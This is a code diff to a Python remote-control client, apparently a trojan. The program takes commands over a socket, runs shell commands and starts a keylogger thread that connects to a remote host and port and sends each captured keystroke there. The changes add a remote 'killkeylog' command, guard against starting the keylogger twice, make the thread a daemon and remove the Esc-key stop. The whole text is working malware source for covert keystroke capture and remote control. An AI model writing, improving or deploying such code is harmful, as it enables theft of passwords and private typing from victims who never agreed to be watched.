@@ -7,10 +7,19 @@ currentPath = os.getcwd()
 
 keylogRunning = False
 
+killThread = False
+
 def on_press(key):
 	global kS
-	if key == Key.esc:
+	global killThread
+	global keylogRunning
+	if killThread:
+		keylogRunning = False
+		send = kS.send("kill".encode('utf8'))
+		killThread = False
 		return False
+	# if key == Key.esc:
+	# 	return False
 	send = kS.send(str(key).encode('utf8'))
 	
 
@@ -32,12 +41,13 @@ def keylogger(kPort):
 		try:
 			kS.connect((host,kPort))
 			kNotConnected = False
+			keylogRunning = True
 		except:
 			kNotConnected = True
 
 	with Listener(on_press=on_press) as listener:
 		listener.join()
-		keylogRunning = True
+		
 
 def checkCom(command):
 	global received
@@ -59,6 +69,8 @@ def runShell(command):
 def receive():
 	global received
 	global currentPath
+	global killThread
+	global keylogRunning
 	received = s.recv(1024).decode('utf8')
 	
 	if checkCom('quit'):
@@ -110,13 +122,24 @@ def receive():
 		f.close()
 
 	elif checkCom('keylog'):
-		if received:
+		if received and not keylogRunning:
 			process = Thread(target=keylogger, args=[int(received)])
+			process.daemon = True
 			process.start()
 			#process.join()
 			args = 'Starting Keylogger'
+		elif keylogRunning and received:
+			args = 'Keylogger Already Running'
 		else:
 			args = 'Provide Valid Port'
+
+
+	elif checkCom('killkeylog'):
+		if keylogRunning:
+			killThread = True
+			args = 'Killing Keylogger'
+		else:
+			args = 'Keylogger Not Running'
 
 	else:
 		args = 'Command: "' + received + '" Is Not Recognised'
